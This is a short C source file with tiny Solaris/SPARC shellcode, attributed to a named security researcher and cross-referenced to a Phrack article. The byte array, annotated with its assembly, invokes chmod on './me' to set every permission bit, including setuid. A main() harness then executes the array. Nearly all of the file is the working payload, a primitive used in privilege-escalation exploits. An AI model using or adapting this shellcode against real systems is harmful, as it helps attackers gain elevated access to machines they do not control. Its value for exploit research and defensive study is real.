/*
 * sparc_solaris_chmod2.c - Solaris/SPARC chmod() shellcode
 * Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Very small Solaris/SPARC chmod shellcode. See also:
 * http://phrack.org/issues/70/13.html#article
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
 */

char sc[] = /* Solaris/SPARC chmod() shellcode (max size is 36 bytes) */

/* chmod("./me", 037777777777) */
"\x92\x20\x20\x01"	/* sub  %g0, 1, %o1		*/
"\x20\xbf\xff\xff"	/* bn,a <sc>			*/
"\x20\xbf\xff\xff"	/* bn,a <sc + 4>		*/
"\x7f\xff\xff\xff"	/* call <sc + 8>		*/
"\x90\x03\xe0\x14"	/* add  %o7, 0x14, %o0		*/
"\xc0\x22\x20\x04"	/* clr  [ %o0 + 4 ]		*/
"\x82\x10\x20\x0f"	/* mov  0xf, %g1		*/
"\x91\xd0\x20\x08"	/* ta   8			*/
"./me";

void main()
{
	void (*f)() = (void *)sc;
	f();
}